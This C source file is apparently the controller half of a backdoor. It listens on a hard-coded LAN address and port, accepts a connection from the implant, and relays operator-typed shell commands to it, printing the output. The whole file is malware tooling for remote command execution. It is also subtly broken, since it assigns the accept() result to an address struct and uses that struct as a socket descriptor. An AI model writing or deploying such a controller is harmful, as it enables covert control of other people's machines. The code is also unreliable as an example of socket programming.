#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
  // socket
  int sock, client_socket;
  char buffer[1024]; // store the command to send to the backdoor
  char response[18384];
  struct sockaddr_in server, client;
  int i = 0;
  int optval = 1;
  socklen_t client_length;

  // generating socket configuration
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
    printf("Error setting TCP socket options \n");
    return 1;
  }
  // server settings
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = inet_addr("192.168.1.111");
  server.sin_port = htons(6969);
  // bind settings to the pointer server
  bind(sock, (struct sockaddr *) &server, sizeof(server));
  // listen connections
  listen(sock, 5);
  client_length = sizeof(client);
  client = accept(sock, (struct sockaddr *) &client, &client_length);
  // loop
  while(1) {
     jump:
     bzero(&buffer, sizeof(buffer));
     bzero(&response, sizeof(response));
     // input commands her
     printf("> Shell#%s-$: ", inet_ntoa(client.sin_addr));
     // wait for input - store it on buffer
     fgets(buffer, sizeof(buffer), stdin); // getting the command from the stdin
     // trimming characters
     strtok(buffer, "\n");
     // send command to the backdoor
     write(client, buffer, sizeof(buffer));
     if(strncmp("q", buffer, 1) == 0) {
       // quit command
       break;
     } else {
       recv(client, response, sizeof(response), MSG_WAITALL); // block ops until the full request is done
       // printing response
       printf("%s", response);
     }
  }
}
